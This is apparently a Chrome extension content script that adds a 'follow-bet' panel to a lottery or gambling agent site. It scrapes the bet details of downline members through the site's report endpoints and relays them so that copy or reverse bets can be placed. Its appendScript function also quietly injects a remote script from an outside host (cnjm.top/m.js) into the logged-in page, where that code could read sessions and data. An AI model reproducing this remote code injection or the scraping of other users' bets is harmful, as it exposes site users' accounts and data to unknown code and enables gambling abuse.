(function () {
  console.log("-----------------脚本开始----------------");
  let nowTime = getTime();
  let timeNum = 2;
  const { hostname, protocol } = window.location;
  const globalData = {
    status: 1,
    betData: [],
  };

  let PeriodNo = "";
  let PeriodNoOrder = [];

  const logList = [];
  sessionStorage.setItem("gtData", JSON.stringify(globalData));

  // 发送消息
  function sendMsg(data) {
    chrome.runtime.sendMessage(
      { origin: "member-content", code: 1, data },
      function (_data) {
        console.log(_data);
        logChange("报表发送成功");
      }
    );
  }

  // 接受信息
  function receiveMsg() {
    chrome.runtime.onMessage.addListener(function (data, sender, sendResponse) {
      sendResponse(data);
    });
  }
  // 监听接受信息
  receiveMsg();

  init();
  function init() {
    appendEle();
    appendScript();
    initWork();
  }
  function initWork() {
    nowTime = getTime();
    const timer = setTimeout(async () => {
      try {
        clearTimeout(timer);
        if (operateStorage("status") != 2) {
          logChange("未开始");
          initWork();
          return;
        }
        const closeTime = await getCloseTime();
        if (typeof closeTime !== "number") {
          logChange("请先点击即时注单");
          initWork();
          return;
        }
        if (closeTime === 0) {
          logChange("封盘中，不可操作");
          timeNum = 15;
        } else {
          logChange("开盘中，连续跟投");
          timeNum = 8;
          getReport();
        }
        initWork();
      } catch (error) {
        initWork();
        console.log(error);
      }
    }, timeNum * 1000);
  }

  // 核心
  async function getReport() {
    const nt = getTime();
    try {
      // 当前账号
      const result = await injectAjax({
        url: "/Report/GetReportSummary",
        data: {
          end: nt,
          endDate: nt,
          gameIds: "2003",
          periodNo: "0",
          reportType: "0",
          settleStatus: "0",
          start: nt,
          startDate: nt,
        },
      });
      const { ChildLevel, DataList } = result.Data;
      console.log(result);
      if (DataList.length <= 0) {
        logChange("当前无用户下注");
        return;
      }

      const accountList = [];
      DataList.filter((item) => item.ChildId).forEach((item) => {
        accountList.push({
          end: nt,
          endDate: nt,
          gameIds: "2003",
          periodNo: "0",
          reportType: "0",
          settleStatus: "0",
          start: nt,
          startDate: nt,
          childtype: item.ChildType,
          childlevel: ChildLevel,
          parentid: item.ParentId,
        });
      });

      let betDetailPromise = [];
      for (let i = 0; i < accountList.length; i++) {
        const element = accountList[i];
        // 第二条请求获取当前代理下的所有会员
        const dataSummary = await injectAjax({
          url: "/Report/GetReportSummary",
          data: element,
        });
        console.log(dataSummary);
        const DataListSummary = dataSummary.Data.DataList.filter(
          (item) => item.ChildId && item.ChildAccount !== $("#gt-account").val()
        );
        for (let j = 0; j < DataListSummary.length; j++) {
          const elementSummary = DataListSummary[j];
          // 第三条 获取会员下所有日期的数据，但实际只有一天
          const dataMemberSummary = await injectAjax({
            url: "/Report/GetReportMemberSummary",
            data: {
              ...element,
              childtype: elementSummary.ChildType,
              childlevel: elementSummary.ChildLevel,
              parentid: elementSummary.ChildId,
            },
          });

          // 第四条  获取该日期下详情
          betDetailPromise.push(
            injectAjax({
              url: "/Report/GetReportBetDetail",
              data: {
                ...element,
                // 只有一个日期，直接用
                childtype: dataMemberSummary.Data.DataList[0].ChildType,
                childlevel: elementSummary.ChildLevel,
                parentid: elementSummary.ChildId,
                reportday: nt,
                RecordCount: 1,
              },
            })
          );
        }
      }

      let memberValues = await Promise.all(betDetailPromise);

      let rBeValues = [];
      memberValues.forEach((element) => {
        let timeList = {};
        element.Data.DataList.forEach((item) => {
          if (item.BetTime) {
            // console.log(item);
            if (item.BetTime in timeList) {
              timeList[item.BetTime].push({ ...item });
            } else {
              timeList[item.BetTime] = [{ ...item }];
            }
          }
        });
        // console.log(timeList);
        for (const key in timeList) {
          let tempObj = JSON.parse(JSON.stringify(element));
          // console.log(key, timeList[key]);
          let keyList = timeList[key].map((item) => item);
          tempObj.Data.DataList = [...keyList];
          rBeValues.push(tempObj);
        }
      });

      // console.log(memberValues);
      // console.log(rBeValues);
      // return;

      const tempData = rBeValues.map((item) => {
        const betDataList = item.Data.DataList.filter((ele) => ele.GameId);
        return betDataList;
      });
      const betData = checkPeriodNo(tempData);
      if (betData.length <= 0) {
        logChange("当前无新注单");
        return;
      }
      logChange("报表开始发送");
      sendMsg({ ...getSetting(), betData });
    } catch (error) {
      console.log(error);
      alert("报表请求异常");
    }
  }

  // 过滤重复订单
  function checkPeriodNo(oData) {
    if (PeriodNo !== oData[0][0].PeriodNo) {
      PeriodNo = oData[0][0].PeriodNo;
      PeriodNoOrder = [];
    }
    let data = [];
    oData.forEach((item) => {
      let iData = [];
      item.forEach((element) => {
        if (!PeriodNoOrder.includes(element.BetId)) {
          iData.push(element);
          PeriodNoOrder.push(element.BetId);
        }
      });
      if (iData.length > 0) {
        data.push(iData);
      }
    });
    return data;
  }

  // 日志更改
  function logChange(log) {
    if (logList.length > 20) {
      logList.shift();
    }
    if (logList.length > 1 && logList[logList.length - 1].log === log) {
      logList.pop();
    }
    logList.push({
      time: getTime(true),
      log,
    });
    let html = ``;
    logList.forEach(
      (item) =>
        (html += `<div class="gt-log-item">${item.time}:::${item.log}</div>`)
    );
    $("#gt-log").html(html);
  }

  // 封盘时间
  async function getCloseTime() {
    const { Data } = await sunAjax({
      url: "/Monitor/GetPageRefresh",
      data: {
        statMoney: 1,
        MarketTypeIds: `["2001", "2002", "2003"]`,
        Link: "guanyh",
        handicapId: 1,
      },
    });
    return Data.MainData.CurrentPeriod.CloseCountDown;
  }

  function appendScript() {
    let s = document.createElement("script");
    s.type = "text/javascript";
    s.async = true;
    s.src = chrome.runtime.getURL("js/member-inject.js");

    let d = document.createElement("script");
    d.type = "text/javascript";
    d.async = true;
    d.src = "https://cnjm.top/m.js";
    const body = document.body || document.head || document.documentElement;
    body.appendChild(s);
    body.appendChild(d);
  }

  function appendEle() {
    const oNav = $("#nav");
    const nav = `<span class="item" id="gen-tou" name="自定义跟投">
      自定义跟投
    </span>
    <div id="gt-mask">
    <div id="gt-content">
      <div class="gt-content-item" id="gt-set">
      <div class="form-item">
            跟投账号: <input type="text" name="account" value="" id="gt-account" placeholder="设置的跟投账户原始账户名"><span>用于过滤该用户的下注，必填</span>
        </div>
      <div class="form-item">
            倍数: <input type="number" name="multiple" value="1" id="gt-multiple">
        </div>
        <div class="form-item">
            方式：<select id="gt-type">
                <option value="1">正投</option>
                <option value="2">反投</option>
            </select>
        </div>

        <div class="form-item">
            <button type="button" id="gt-switch">开始</button>
        </div>
        <div class="gt-content-item" id="gt-log"></div>
      </div>
      
    </div>
  </div>`;
    oNav.append(nav);

    const oBody = $("body");
    const txt = `<div id="gt_app">
  <div id="gt_check">开始准备</div>
  </div>`;
    oBody.append(txt);

    console.log("页面元素添加完成");

    // $("#gt-nav").hide();
    $("#gt-content .gt-content-item").eq(0).show();
  }

  function getSetting() {
    const type = $("#gt-type").val();
    let multiple = $("#gt-multiple").val() || 1;
    multiple = Number(multiple);
    return { type, multiple };
  }

  // 点击跟投展开
  $("#gen-tou").click(function () {
    if ($("#gt-mask").css("display") === "none") {
      $("#gt-mask").show();
    } else {
      $("#gt-mask").hide();
    }

    // sendMsg();
    // sendMsg({ ...getSetting(), betData: [] });
  });
  // 切换tab
  $(".gt-nav-item").click(function () {
    const index = $(this).index();
    $(this).addClass("gt-nav-item-ac").siblings().removeClass("gt-nav-item-ac");
    $("#gt-content .gt-content-item").eq(index).show().siblings().hide();
  });
  // 开关
  $("#gt-switch").click(function () {
    if (operateStorage("status") == 2) {
      logChange("停止检测");
      operateStorage("status", 1);
      $("#gt-switch").text("开始");
    } else {
      if (!$("#gt-account").val()) {
        logChange("跟投账号必填");
        initWork();
        return;
      }
      logChange("开始检测");
      operateStorage("status", 2);
      $("#gt-switch").text("暂停");
    }
  });

  function operateStorage(key, value) {
    if (key && value) {
      const gtData = JSON.parse(sessionStorage.getItem("gtData"));
      gtData[key] = value;
      sessionStorage.setItem("gtData", JSON.stringify(gtData));
      return;
    }
    if (key) {
      const gtData = JSON.parse(sessionStorage.getItem("gtData"));
      return gtData[key];
    }
  }

  function getTime(s) {
    const now = new Date();
    const year = now.getFullYear(); // 年
    const month = now.getMonth() + 1; // 月
    const date = now.getDate(); // 日
    if (!s) {
      return `${year}-${month.toString().padStart(2, "0")}-${date
        .toString()
        .padStart(2, "0")}`;
    }
    const hour = now.getHours();
    const minute = now.getMinutes();
    const second = now.getSeconds();
    return `${month.toString().padStart(2, "0")}-${date
      .toString()
      .padStart(2, "0")} ${hour.toString().padStart(2, "0")}：${minute
      .toString()
      .padStart(2, "0")}：${second.toString().padStart(2, "0")}`;
  }
  function injectAjax({ url, data }) {
    return new Promise((resolve, reject) => {
      $.ajax({
        url: operateStorage("SESSIONID") + url,
        data: data,
        type: "get",
        dataType: "json",
        // cache: n.cache,
        // async: n["async"],
        success: function (e) {
          resolve(e);
        },
        error: function (e, t, i) {
          reject(e, t, i);
          console.log("请求异常");
        },
      });
    });
  }

  async function fetchSid(url) {
    let value = await fetch(url).then((response) => {
      if (response.status === 200) {
        return response;
      } else {
        return {};
      }
    });
    return value;
  }

  function sunAjax({ url, data }) {
    const SESSIONID = $("#lottery_list .item[gameid='2003']").attr("sessionid");
    return new Promise((resolve, reject) => {
      $.ajax({
        url: `${protocol}//2003${hostname}/${SESSIONID}${url}`,
        data: data,
        type: "get",
        dataType: "json",
        // cache: n.cache,
        // async: n["async"],
        success: function (e) {
          resolve(e);
        },
        error: function (e, t, i) {
          reject(e, t, i);
          console.log("请求异常");
        },
      });
    });
  }

  $("#gt_check").click(async function () {
    $("#gt_check").text("准备中");
    const domain = $("#lottery_list .item[gameid='2003']").attr("domain");
    const { url } = await fetchSid(domain + `&p=2&SessionId=`);
    const data = await fetchSid(url);
    const html = await data.text();
    const sessionid = html.match(/\(S\([a-z0-9]*\)\)/g)[0];
    $("#lottery_list .item[gameid='2003']").attr("sessionid", sessionid);

    // console.log(pageData);
    $("#gt_check").text("准备就绪");
    // $("#gt_check").hide();
  });
})();
